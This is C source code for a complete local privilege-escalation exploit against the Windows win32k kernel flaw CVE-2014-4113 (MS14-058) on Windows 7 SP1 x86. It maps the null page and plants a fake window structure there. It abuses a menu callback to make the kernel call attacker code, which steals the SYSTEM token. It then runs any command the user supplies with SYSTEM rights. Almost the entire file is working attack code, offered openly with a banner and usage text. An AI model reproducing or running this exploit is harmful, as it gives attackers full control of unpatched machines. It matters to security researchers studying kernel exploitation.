/*
 *     Win32k Hurricane Panda
 *    CVE-2014-4113 / MS14-058
 * Vulnerability Discovery: Unknown
 * Exploit Authors: Ashfaq Ansari
 *
 * Refrences:
 *		http://blog.trendmicro.com/trendlabs-security-intelligence/an-analysis-of-a-windows-kernel-mode-vulnerability-cve-2014-4113/
 *		http://www.fireeye.com/blog/technical/targeted-attack/2014/10/two-targeted-attacks-two-new-zero-days.html
 *		http://blogs.technet.com/b/srd/archive/2014/10/14/accessing-risk-for-the-october-2014-security-updates.aspx
 *		https://technet.microsoft.com/library/security/ms14-058
 */

#include "CVE-2014-4113.h"

WNDPROC oldWndProc = {0};
BOOL HookOnlyOnce = FALSE;
BOOL PostOnlyOnce = FALSE;

CONST UCHAR shellCode[] = "\x60"                          // 0x00000001:  pushad
						  "\x31\xc0"                      // 0x00000002:  xor eax,eax
						  "\x64\x8b\x80\x24\x01\x00\x00"  // 0x00000004:  mov eax,[fs:eax+0x124]
						  "\x8b\x40\x50"                  // 0x0000000B:  mov eax,[eax+0x50]
						  "\x89\xc1"                      // 0x0000000E:  mov ecx,eax
						  "\x8b\x98\xf8\x00\x00\x00"      // 0x00000010:  mov ebx,[eax+0xf8]
						  "\xba\x04\x00\x00\x00"          // 0x00000016:  mov edx,0x4
						  "\x8b\x80\xb8\x00\x00\x00"      // 0x0000001B:  mov eax,[eax+0xb8]
						  "\x2d\xb8\x00\x00\x00"          // 0x00000021:  sub eax,0xb8
						  "\x39\x90\xb4\x00\x00\x00"      // 0x00000026:  cmp [eax+0xb4],edx
						  "\x75\xed"                      // 0x0000002C:  jnz 0x1b
						  "\x8b\x90\xf8\x00\x00\x00"      // 0x0000002E:  mov edx,[eax+0xf8]
						  "\x89\x91\xf8\x00\x00\x00"      // 0x00000034:  mov [ecx+0xf8],edx
						  "\x61"                          // 0x0000003A:  popad
						  "\x31\xc0"                      // 0x0000003C:  xor eax,eax
						  "\x81\xc4\x10\x01\x00\x00"      // 0x0000003E:  add esp,0x110 
														  // ret to win32k!xxxTrackPopupMenuEx+0x5cd
						  "\x5d"                          // 0x00000044:  pop ebp
						  "\xc3";                         // 0x00000045:  ret

// Taken from: https://github.com/sam-b/CVE-2014-4113/blob/master/Exploit/Exploit/Exploit.cpp
// The shellcode crashes due. This one takes care of properly cleaning up the stack. So that
// when returning back to kernel after token steal. We unwind cleanly.
// Windows 7 SP1 x86 Offsets
#define KTHREAD_OFFSET    0x124    // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET   0x050    // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET        0x0B4    // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET      0x0B8    // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET      0x0F8    // nt!_EPROCESS.Token
#define SYSTEM_PID        0x004    // SYSTEM Process PID

int __stdcall TokenStealingShellcodeWin7(int one, int two, int three, int four) {
	__asm {
		; initialize
		pushad; save registers state

		xor eax, eax; Set zero
		mov eax, fs: [eax + KTHREAD_OFFSET] ; Get nt!_KPCR.PcrbData.CurrentThread
		mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process

		mov ecx, eax; Copy current _EPROCESS structure

		mov ebx, [eax + TOKEN_OFFSET]; Copy current nt!_EPROCESS.Token
		mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM Process PID = 0x4

		SearchSystemPID:
		mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
		sub eax, FLINK_OFFSET
		cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
		jne SearchSystemPID
		
		mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
		mov[ecx + TOKEN_OFFSET], edx; Copy nt!_EPROCESS.Token of SYSTEM
		; to current process
		popad; restore registers state
	}
	return 0;
}


static VOID Die(CONST PTCHAR fmt, ...)
{
	va_list args;
	fflush(stdout);
	va_start(args, fmt);
	vfprintf(stderr, fmt, args);
	va_end(args);
	exit(EXIT_FAILURE);
}

static VOID ShowUsage(PTCHAR argv0)
{
	Die("\n"
		"Usage: %s cmd.exe\n"
		"\n", argv0);
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
		case WM_ENTERIDLE:
			if (!PostOnlyOnce)
			{
				PostOnlyOnce = TRUE;
				DEBUG_MESSAGE("[+] Simulating User Interaction\n");

				// this vulnerability only occurs when menu callback
				// is executed and for that it's important that user
				// clicks on the menu. since this is manual task so
				// let's automate it. simulate user actions
				PostMessage(hWnd, WM_KEYDOWN, 0x28, 0);
                PostMessage(hWnd, WM_KEYDOWN, 0x27, 0);
				PostMessage(hWnd, WM_LBUTTONDOWN, 0x0, 0);
			}
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return EXIT_SUCCESS;
}

LRESULT CALLBACK SubClassNewWndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	LRESULT lResult = {0};

	switch (message)
	{
		case MN_FINDMENUWINDOWFROMPOINT:
			// end the calling thread's active menu
			// so that user does not see the menu
			EndMenu();

			DEBUG_MESSAGE("[+] Triggering Vulnerability\n");

			// vulnerability lies here
			// this value is used as memory address without validating
			lResult = -5; 
			break;
		default:
			lResult = CallWindowProc(oldWndProc, hWnd, message, wParam, lParam);
			break;
	}
	return lResult;
}

HMENU CreatePopUpMenus(VOID)
{
	HMENU hMenu1 = {0};
	HMENU hMenu2 = {0};

	MENUITEMINFO menuItemInfo1 = {0};
	MENUITEMINFO menuItemInfo2 = {0};

	// create the first popup menu
	hMenu1 = CreatePopupMenu();

	if (hMenu1)
	{
		DEBUG_MESSAGE("[+] CreatePopupMenu: 0x%p\n", hMenu1);

		menuItemInfo1.cbSize = sizeof(MENUITEMINFO);
		menuItemInfo1.fMask = MIIM_STRING;

		// insert the menu
		if (InsertMenuItem(hMenu1, 0, TRUE, &menuItemInfo1)) 
		{
			// create the second popup menu
			hMenu2 = CreatePopupMenu();
			DEBUG_MESSAGE("[+] CreatePopupMenu: 0x%p\n", hMenu2);
			
			menuItemInfo2.fMask = MIIM_STRING | MIIM_SUBMENU;
			menuItemInfo2.cch = 1;
			menuItemInfo2.hSubMenu = hMenu1;
			menuItemInfo2.cbSize = sizeof(MENUITEMINFO);
			menuItemInfo2.dwTypeData = "";
			
			// insert the menu
			if (!hMenu2 || !InsertMenuItem(hMenu2, 0, TRUE, &menuItemInfo2)) 
			{
				// destroy the specified menu and free memory
				DestroyMenu(hMenu1);
				DEBUG_MESSAGE("[+] DestroyMenu: 0x%p\n", hMenu1);

				if (hMenu2) 
				{
					// destroy the specified menu and free memory
					DestroyMenu(hMenu2);
					DEBUG_MESSAGE("[+] DestroyMenu: 0x%p\n", hMenu2);

					hMenu2 = NULL;
				}
			}
		}
		else
		{
			// destroy the specified menu and free memory
			DestroyMenu(hMenu1);
			DEBUG_MESSAGE("[+] DestroyMenu: 0x%p\n", hMenu1);
		}
	}
	return hMenu2;
}

LRESULT CALLBACK WndProcCallbackHook(INT nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION)
	{
		PCWPSTRUCT pCwpStruct = (PCWPSTRUCT)lParam;
		
		switch (pCwpStruct->message)
		{
			case MN_FINDMENUWINDOWFROMPOINT:
				if (!HookOnlyOnce)
				{
					HookOnlyOnce = TRUE;

					// veiw details of Wnd for which MN_FINDMENUWINDOWFROMPOINT message is sent
					DEBUG_MESSAGE("[+] tagCWPSTRUCT->lParam: 0x%p\n", pCwpStruct->lParam);
					DEBUG_MESSAGE("[+] tagCWPSTRUCT->wParam: 0x%p\n", pCwpStruct->wParam);
					DEBUG_MESSAGE("[+] tagCWPSTRUCT->message: 0x%p\n", pCwpStruct->message);
					DEBUG_MESSAGE("[+] tagCWPSTRUCT->hwnd: 0x%p\n", pCwpStruct->hwnd);

					// Unhook the applied hook on WH_CALLWNDPROC
					if (UnhookWindowsHook(WH_CALLWNDPROC, WndProcCallbackHook))
					{
						// set new address of lpfnWndProc callback function
						oldWndProc = (WNDPROC)SetWindowLongPtr(pCwpStruct->hwnd, GWL_WNDPROC, (ULONG_PTR)SubClassNewWndProc);
					}
				}
				break;
			
			default:
				break;
		}
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD GetWin32ThreadInfo(VOID) 
{
	DWORD currentWin32ThreadInfo = {0};

	DEBUG_MESSAGE("[*] Getting Current Win32ThreadInfo\n");

	__asm
	{
		mov eax, fs:18h      // get TEB
		mov eax, [eax + 40h] // get Win32ThreadInfo
		mov currentWin32ThreadInfo, eax
	}

	if (currentWin32ThreadInfo == 0)
	{
		Die("[-] Failed Getting Win32ThreadInfo\n");
	}
	else
	{
		DEBUG_MESSAGE("[+] Win32ThreadInfo: 0x%p\n", currentWin32ThreadInfo);
	}

	return currentWin32ThreadInfo;
}

BOOL MapNullPage(VOID) 
{
	HMODULE hNtdll;
	PVOID baseAddress = (PVOID)0x00000001; // will be rounded down to the next host 
										   // page size address boundary -> 0x00000000

	SIZE_T regionSize = 0x1000;			   // will be rounded up to the next host 
										   // page size address boundary -> 0x2000
	NTSTATUS ntStatus;
	_NtAllocateVirtualMemory NtAllocateVirtualMemory;

	hNtdll = GetModuleHandle("ntdll.dll");

	// grab the address of NtAllocateVirtualMemory
	NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

	// allocate the memory
	ntStatus = NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF, &baseAddress, 0, &regionSize, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE); 

	if(ntStatus != 0)
	{
		Die("[-] NtAllocateVirtualMemory Failed: 0x%x\n", ntStatus);
	}
 	else
	{
		DEBUG_MESSAGE("[+] NtAllocateVirtualMemory \n\tBaseAddress: %p\n\tRegionSize: 0x%x\n", baseAddress, regionSize);
	}

	FreeLibrary(hNtdll);

	return TRUE;
}

BOOL CreateFakeWNDStructure(VOID)
{
	DWORD gptiCurrent = {0};
	PBYTE nullPageBaseAddress = {0};
	PVOID tempAddress = {0};

	// get current thread's Win32ThreadInfo value from TEB+40
	// sanity check has been implemented in GetWin32ThreadInfo()
	gptiCurrent = GetWin32ThreadInfo();

	DEBUG_MESSAGE("[+] Creating Fake WND Structure:\n");

	/*
	.text:BF8B93F4
	.text:BF8B93F4 CrashOccursHere:                        ; CODE XREF: xxxSendMessageTimeout(x,x,x,x,x,x,x,x)+60j
	.text:BF8B93F4                                         ; xxxSendMessageTimeout(x,x,x,x,x,x,x,x)+A4j
	.text:BF8B93F4                 mov     edi, _gptiCurrent
	.text:BF8B93FA                 cmp     edi, [esi+8]    ; pWND ESI=FFFFFFFB - > Crash ; we need to place at FFFFFFFB+8
	.text:BF8B93FD                 jz      loc_BF8B9487    ; 0xFFFFFFFB + 0x8 = 0x3
	*/

	tempAddress = nullPageBaseAddress + 0x3;
	*(PDWORD)tempAddress = gptiCurrent;

	DEBUG_MESSAGE("[+] \tWin32ThreadInfo -> 0x%p\n", tempAddress);

	/*
	.text:BF8B94C0
	.text:BF8B94C0 KernelCheck:                            ; CODE XREF: xxxSendMessageTimeout(x,x,x,x,x,x,x,x)+151j
	.text:BF8B94C0                 test    byte ptr [esi+16h], 4 ; Kernel Check ; 0xFFFFFFFB + 0x16 = 0x11
	.text:BF8B94C4                 lea     eax, [ebp+HighLimit]
	.text:BF8B94C7                 push    eax
	.text:BF8B94C8                 jz      short loc_BF8B9505 ; if we make esi+16=4, then we will pass the block
	*/

	tempAddress = nullPageBaseAddress + 0x11;
	*(PDWORD)tempAddress = 0x4;

	DEBUG_MESSAGE("[+] \tKernelCheck -> 0x%p\n", tempAddress);

	/*
	.text:BF8B94E8 CallShellcode:                          ; CODE XREF: xxxSendMessageTimeout(x,x,x,x,x,x,x,x)+198j
	.text:BF8B94E8                 push    [ebp+Address]
	.text:BF8B94EB                 push    dword ptr [ebp+UnicodeString]
	.text:BF8B94EE                 push    ebx
	.text:BF8B94EF                 push    esi
	.text:BF8B94F0                 call    dword ptr [esi+60h] ; call Shellcode
	                                                           ; we need to place our shellcode address
															   ; 0xFFFFFFFB + 0x60 = 0x5B
	
	.text:BF8B94F3                 mov     ecx, [ebp+arg_18]
	.text:BF8B94F6                 test    ecx, ecx
	.text:BF8B94F8                 jz      loc_BF8B9591
	.text:BF8B94FE                 mov     [ecx], eax
	.text:BF8B9500                 jmp     loc_BF8B958A
	*/

	tempAddress = nullPageBaseAddress + 0x5B;
	*(PDWORD)tempAddress = (DWORD)TokenStealingShellcodeWin7;

	DEBUG_MESSAGE("[+] \tShellcode -> 0x%p\n", tempAddress);

	return TRUE;
}

DWORD WINAPI ExploitThread(LPVOID lpParameter)
{
	HWND hWindow = {0};
	HMENU hMenu = {0};
	WNDCLASS wndClass = {0};
	static CONST PTCHAR szWindowClass = "HACKSYS_CLASS";

	wndClass.lpfnWndProc   = WndProc;
	wndClass.lpszClassName = szWindowClass;

	// register the window class WNDCLASS
	if (!RegisterClass(&wndClass))
	{
		DEBUG_MESSAGE("[-] RegisterClass Failed: 0x%08x\n", GetLastError());
		return EXIT_FAILURE;
	}
	else
	{
		DEBUG_MESSAGE("[+] Kernel RegisterClass: 0x%p\n", &wndClass);

		// create the window by passing the WNDCLASS structure
		hWindow = CreateWindowEx(0, szWindowClass, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0);

		if (!hWindow)
		{
			DEBUG_MESSAGE("[-] CreateWindowEx Failed: 0x%08x\n", GetLastError());
			return EXIT_FAILURE;
		}
		else
		{
			DEBUG_MESSAGE("[+] Kernel CreateWindwEx: 0x%p\n", hWindow);

			// map null page
			if (MapNullPage())
			{
				if (!CreateFakeWNDStructure())
				{
					Die("[-] Fake Data Setup Failed\n");
				}
			}

			// create the popup menus
			hMenu = CreatePopUpMenus();

			if (hMenu) 
			{
				// hook WH_CALLWNDPROC
				if (SetWindowsHookEx(WH_CALLWNDPROC, (HOOKPROC)&WndProcCallbackHook, NULL, GetCurrentThreadId())) 
				{
					DEBUG_MESSAGE("[+] Hooked: WH_CALLWNDPROC\n");

					// now display floating pop-up menu and tracks the selection 
					// of items on the pop-up menu by calling TrackPopupMenu()
					// by doing this, we will enter the menu's callback procedure
					TrackPopupMenu(hMenu, 0, -10000, -10000, 0, hWindow, 0);
				}
			}

			if (hMenu)
			{
				// destroy the specified menu and free
				// any memory that the menu has occupied
				DestroyMenu(hMenu);
				DEBUG_MESSAGE("[+] DestroyMenu: 0x%p\n", hMenu);
			}

			if (hWindow)
			{
				// destroy the specified window
				DestroyWindow(hWindow);
				DEBUG_MESSAGE("[+] DestroyWindow: 0x%p\n", hWindow);
			}

			// no need to free the memory allocated by NtAllocateVirtualMemory
			// will automatically get freed on exit
		}
	}

	return EXIT_SUCCESS;
}

INT Exploit(PTCHAR command)
{
	STARTUPINFO         startupInfo = {0};
	PROCESS_INFORMATION processInformation = {0};

	// create a new thread
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExploitThread, NULL, 0, 0);

	if (!hThread)
	{
		Die("[-] CreateThread Failed: %s\n", GetLastError());
	}
	else
	{
		DEBUG_MESSAGE("[+] CreateThread: 0x%p\n", hThread);
	}

	if (WaitForSingleObject(hThread, 0x493e0))
	{
		// terminate the thread
		TerminateThread(hThread, 0);
		DEBUG_MESSAGE("[+] TerminateThread: 0x%p\n", hThread);
	}

	startupInfo.wShowWindow = SW_HIDE;
	startupInfo.cb          = sizeof(STARTUPINFO);
	startupInfo.dwFlags     = STARTF_USESHOWWINDOW;

	DEBUG_MESSAGE("[+] Enjoy As SYSTEM\n\n");

	if (!CreateProcess(0, command, 0, 0, 0, 0, 0, 0, &startupInfo, &processInformation))
	{
		Die("[-] CreateProcess Failed: %s\n", GetLastError());	
	}

	WaitForSingleObject(processInformation.hProcess, INFINITE);

	// close the open handles
	CloseHandle(processInformation.hThread);
	CloseHandle(processInformation.hProcess);

	return EXIT_SUCCESS;
}

INT main(UINT argc, PTCHAR argv[])
{
	CONST PTCHAR banner = 
		"                                                                               \n"
		" #     #                       #####               #######                     \n"
		" #     #   ##    ####  #    # #     # #   #  ####     #    ######   ##   #    #\n"
		" #     #  #  #  #    # #   #  #        # #  #         #    #       #  #  ##  ##\n"
		" ####### #    # #      ####    #####    #    ####     #    #####  #    # # ## #\n"
		" #     # ###### #      #  #         #   #        #    #    #      ###### #    #\n"
		" #     # #    # #    # #   #  #     #   #   #    #    #    #      #    # #    #\n"
		" #     # #    #  ####  #    #  #####    #    ####     #    ###### #    # #    #\n"
		"                                                                               \n"
		"                          CVE-2014-41143 / MS14-058                            \n"
		"                                                                               \n";

	// print the banner
	DEBUG_MESSAGE(banner);

	if (argc < 2)
	{
		ShowUsage(argv[0]);
		return EXIT_FAILURE;
	}
	else
	{
		Exploit(argv[1]);
	}

	return EXIT_SUCCESS;
}
